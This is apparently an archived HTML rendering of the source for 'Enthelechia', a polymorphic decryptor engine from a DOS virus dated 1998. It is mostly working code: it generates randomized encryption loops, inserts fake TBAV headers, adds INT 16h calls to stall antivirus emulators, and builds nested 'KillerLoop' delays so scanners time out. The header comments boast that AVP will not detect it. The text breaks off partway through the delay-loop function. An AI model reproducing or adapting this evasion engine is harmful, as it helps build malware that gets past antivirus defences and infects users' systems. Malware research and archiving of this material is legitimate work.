<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.DarkThoughts.6144 - ENTHELEC.SPL.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//
//   SPL for Windows V2.20
//
//   Project Name   :  Enthelechia version 1.00  ( Enthelechia=assiduity )
//   Author     :  ANAKTAS          
//   Origin     :  Europe, Greece
//   Last Update    :  25/07/98
//   Description    :  
//  -8/16-bit keysize
//  -ax/al/ah / bx/bl/bh / cx/cl/ch / dx/dl/dh / bp / si / di   as key register 
//  -si / di / bx [+si/+di] / bp [+si/+di]  [+displacement]    as pointer
//  -MOV reg, / LEA reg,        for setting the pointer register
//  -MOV reg, / LEA reg, / SUB reg,reg + OR reg /  SUB reg,reg + ADD reg / XOR reg,reg + OR reg /  XOR reg,reg + ADD reg
//   for setting  keyRegister 
//  -Add / Sub / Lea / Inc / Dec / Not+Neg / XorFFFF+Neg / Neg+Not / Neg+XorFFFF+Neg 
//   used for manipulation of pointer register
//  -Multiple Manipulation of pointer Register, before and after the crypt instruction. 
//  -Xor/Add/Sub [pointer],keyregister as crypt instruction 
//  -Two directions
//  -JMPs / NOP / CMC / STI / CLD / CLC / STC for garbage
//  -Will sometimes create TBAV headers  
//  -CS: / PUSH CS+POP DS / PUSH CS+POP ES+ES:   for segment
//  Instructions are placed in random order (as far as this is possible)
//  -The decryptor is devided into 3 logigal sections.  
//     1)initialization of registers 
//     2)Decryptor loop
//     3)Encrypted virusbody
//   Those sections will be placed in the file in random order, and linked to each 
//   other with JMPs. 
//  -Will sometimes create CALLs to subfuctions with:
//   1) Int 16 calls     
//   2) delay loops (a.k.a.  "KillerLoop")
//
//Detection:
//  AVP will not detect it. Not even flag it as "suspicion: Type_ComTSR ".
//  NOD-ICE will sometimes detect it as "POLY.CRYPT.TSR.EXE virus".
//  TBAV will sometimes flag it with '#,J,F,M' but won't record it as infected.
//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">




















</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// --*--External variables --*--
// Input -----------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXi_IsCOM</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// xxxx xxx0=yes it's for a COM    //    xxxx xxx1=No it's for an EXE.
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXi_VirusBodyStart</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// offset of the virus body 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXi_VirusBodyLength</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// lenght of virus. This one can tern into a constant later, if you know the lenght, or just make it equal to 8192 bytes.  
// output ---------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXo_DecryptorStart</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// offset of decryptor in SPL_BUFFER
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXo_DecryptorVirusLength</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// That's Decryptor + virus + garbage SIZE 
</span><span class="sc0">                    </span><span class="sc2">// OR Decryptor + garbage + virus + garbage SIZE
</span><span class="sc0">                    </span><span class="sc2">// OR decr/ + garbage + virus + /yptor + garbage SIZE
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXo_EncryptorOffset</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// The offset of the Encryption routine in the SPL_BUFFER 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">external</span><span class="sc0"> </span><span class="sc11">EXo_EncryptedVirusBodyOffset</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// The offset of the Encrypted virus body
</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">



















</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// Important Values 
// --------------------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">DecryptorStart</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">CryptDisplacement</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">BaseRegister</span><span class="sc10">;</span><span class="sc0">    
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">IndexRegister</span><span class="sc10">;</span><span class="sc0">    
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">




































</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//important switches
// --------------------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_Direction</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// 0=down   1=up 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_UseDisplacement</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// 0=No 1=Yes   
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_IndexReg</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// 0=SI 1=DI
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// 0=Index 1=Base   2=Both   3=Base
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// 0=BX 1=BP
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_UseRegForKey</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// 0=No 1=Yes 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// 0=8bit   1=16bit
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_Segment</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// 0=CS:    1=push CS pop DS  2=push CS pop ES
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// if 8bit  0=AL  1=CL  2=DL  3=BL  4=AH  5=CH  6=DH  7=BH
</span><span class="sc0">                </span><span class="sc2">// if 16bit 0=AX  1=CX  2=DX  3=BX  4=SP  5=BP  6=SI  7=DI 
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_CryptType</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// 0=ADD    1=SUB   2=XOR
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// 000=none 001=first   010=second   100=third    
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_UseInt16</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// 0=Don't 1=of course...
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_UseKillerLoop</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// 0=Don't 1=I love danger!
//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">












</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// DynaKillConflicts
// _________________ 
// What if SW_keyReg says that the key register is the same with the register used as pointer? 
// That was a hard question to myself. Should i add flow control like "if (cmp) then else"  on my SplVM? 
// How could i check for conflicts? Is SPL a crap? No! i found it! SPL is not like other languages, it has
// a different kind of flow control. Does not check for anything on runtime. Just follows one of it's billions paths! 
// Isn't it perfect!  (what? confusing? hm...)
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">DynaKillConflicts</span><span class="sc0">   </span><span class="sc11">select</span><span class="sc0">  </span><span class="sc11">SW_UseRegForKey</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//noop;
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">SW_BaseReg</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">SW_BaseReg</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">SW_BaseReg</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">SW_KeyReg</span><span class="sc10">=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc11">SW_BaseReg</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">SW_IndexReg</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">SW_IndexReg</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">           
        </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">









</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// TBAVHEADER
// Emit the headers used by TBAV's programs
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">TBAVHeader</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Don't put a TBAV's header by a ratio of  16/1
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// TBAV's mark. 
</span><span class="sc0">    </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0">  </span><span class="sc11">EXi_IsCOM</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$24h</span><span class="sc10">;</span><span class="sc11">$21h</span><span class="sc10">;};</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0B8h</span><span class="sc10">;</span><span class="sc11">$8Ch</span><span class="sc10">;</span><span class="sc11">$0D3h</span><span class="sc10">;</span><span class="sc11">$15h</span><span class="sc10">;</span><span class="sc11">$33h</span><span class="sc10">;</span><span class="sc11">$randvar</span><span class="sc10">;};</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">





</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//  This function will call the Interrupt 16h (keyboard) with 
//  subfunctions 01h,02h,03h,04h,09h,0Ah,11h,12h which can stop the
//  general decryptor of some AV programs.  
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">Int16Fuc</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseInt16</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc11">all</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">$0EBh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">LB_endofInt16</span><span class="sc10">;</span><span class="sc0"> 

        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_Int16Fuc</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">random</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$50h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mathqueue</span><span class="sc10">=</span><span class="sc4">058h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc2">// PUSH AX  , push POP AX to the mathqueue
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$53h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mathqueue</span><span class="sc10">=</span><span class="sc4">05Bh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc2">// PUSH BX  , push POP BX to the mathqueue
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">
    
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$0B4h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0B8h</span><span class="sc10">;</span><span class="sc11">$randvar</span><span class="sc10">;};</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">          </span><span class="sc2">// MOV AH,   or    MOV AX,-- ??
</span><span class="sc0">        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$01h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$02h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$03h</span><span class="sc10">;</span><span class="sc11">$04h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$09h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$11h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$12h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">// 01h or 02h or 03h 04h or 09h or 11h or 12h
</span><span class="sc0">        </span><span class="sc11">$0CDh</span><span class="sc10">;</span><span class="sc11">$16h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Int 16
</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">mathqueue</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// POP the Registers AX,BX
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">mathqueue</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// 
</span><span class="sc0">
        </span><span class="sc11">$0C3h</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// RET
</span><span class="sc0">
        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">LB_endofInt16</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">CallInt16Fuc</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseInt16</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$0e8h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_Int16Fuc</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">//   CALL  Int16Fuc
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">






</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//   This function will create a delay loop.
//   There are two loops, one inside the other, which add a big delay.
//   The delay might not be noticed by a user, but TBAV and AVP will get borred decrypting this
//   code (timeout check?) , and continue with the next file.
// --------------------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">kl_reg1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">kl_reg2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">loopvalue</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">KillerLoopFuc</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseKillerLoop</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc11">all</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">$0EBh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">LB_endofKillerLoop</span><span class="sc0">

        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_KillerLoop</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">loopvalue</span><span class="sc10">=</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">0011b</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">// asign registers to kl_reg1 and kl_reg1
</span><span class="sc0">        </span><span class="sc11">kl_reg1</span><span class="sc10">=</span><span class="sc11">kl_reg1</span><span class="sc10">&amp;</span><span class="sc4">111b</span><span class="sc10">;</span><span class="sc0">       
        </span><span class="sc11">kl_reg2</span><span class="sc10">=</span><span class="sc11">kl_reg2</span><span class="sc10">&amp;</span><span class="sc4">111b</span><span class="sc10">;</span><span class="sc0">       
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">kl_reg1</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">kl_reg1</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;};</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">kl_reg1</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">kl_reg2</span><span class="sc10">=</span><span class="sc11">kl_reg2</span><span class="sc10">|</span><span class="sc4">001</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">kl_reg2</span><span class="sc10">=</span><span class="sc11">kl_reg2</span><span class="sc10">&amp;</span><span class="sc4">110</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">kl_reg2</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">kl_reg2</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;};</span><span class="sc0">
          

        </span><span class="sc2">// push registers
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">kl_reg1</span><span class="sc10">|</span><span class="sc4">50h</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">kl_reg2</span><span class="sc10">|</span><span class="sc4">50h</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">// loop around...               
</span><span class="sc0">        
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0B8h</span><span class="sc10">|</span><span class="sc11">kl_reg1</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//mov
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$08Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">06</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kl_reg1</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">//lea
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">$randvar</span><span class="sc10">;</span><span class="sc11">$loopvalue</span><span class="sc10">;</span><span class="sc0">    
                
        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_Kloop_outer</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0B8h</span><span class="sc10">|</span><span class="sc11">kl_reg2</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// mov 
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$08Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">06</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kl_reg2</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">// lea
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">$randvar</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">loopvalue</span><span class="sc10">^</span><span class="sc4">0111b</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_Kloop_inner</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">48h</span><span class="sc10">|</span><span class="sc11">kl_reg2</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// dec kl_reg2
</span><span class="sc0">        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0E0h</span><span class="sc10">|</span><span class="sc11">kl_reg2</span><span class="sc10">;</span><span class="sc11">$0ffh</span><span class="sc10">;</span><span class="sc11">$0ffh</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc2">// AND kl_reg2,ffff
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$85h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0C0h</span><span class="sc10">|</span><span class="sc11">kl_reg2</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kl_reg2</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc2">// TEST kl_reg2,kl_reg2
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0F8h</span><span class="sc10">|</span><span class="sc11">kl_reg2</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0">    </span><span class="sc2">// CMP kl_reg2,0000
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">$75h</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">OFS_Kloop_inner</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// jnz OFS_Kloop_inner      
</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">48h</span><span class="sc10">|</span><span class="sc11">kl_reg1</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// dec kl_reg1
</span><span class="sc0">        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0E0h</span><span class="sc10">|</span><span class="sc11">kl_reg1</span><span class="sc10">;</span><span class="sc11">$0ffh</span><span class="sc10">;</span><span class="sc11">$0ffh</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc2">// AND kl_reg1,ffff
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$85h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0C0h</span><span class="sc10">|</span><span class="sc11">kl_reg1</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kl_reg1</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc2">// TEST kl_reg1,kl_reg1
</span><span class="sc0">            </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$81h</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">0F8h</span><span class="sc10">|</span><span class="sc11">kl_reg1</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc11">$0</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc10">};</span><span class="sc0">    </span><span class="sc2">// CMP kl_reg1,0000
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">
